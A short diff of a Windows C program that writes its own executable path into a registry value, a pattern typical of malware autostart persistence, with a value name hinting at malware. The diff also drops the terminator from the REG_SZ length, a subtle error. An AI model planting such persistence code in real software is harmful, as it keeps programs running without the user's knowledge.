@@ -4,7 +4,7 @@
 int main() {
 
 
-	CHAR filename[] = { 0 };
+	CHAR filename[MAX_PATH] = { 0 };
 
 
 	GetModuleFileNameA(NULL, filename, sizeof(filename));
@@ -25,9 +25,9 @@ int main() {
 		printf("error is here");
 	}
 
-	LPSTR valuename = "malallaa";
+	LPSTR valuename = "msala";
 	
-	if (RegSetValueExA(hkey, valuename, 0, REG_SZ,filename,  lstrlenA(filename)+1) != ERROR_SUCCESS) {
+	if (RegSetValueExA(hkey, valuename, 0, REG_SZ,filename,  lstrlenA(filename)) != ERROR_SUCCESS) {
 		printf("Regsetvalueexa failed withe rror no %x\n",GetLastError());
 	}
 
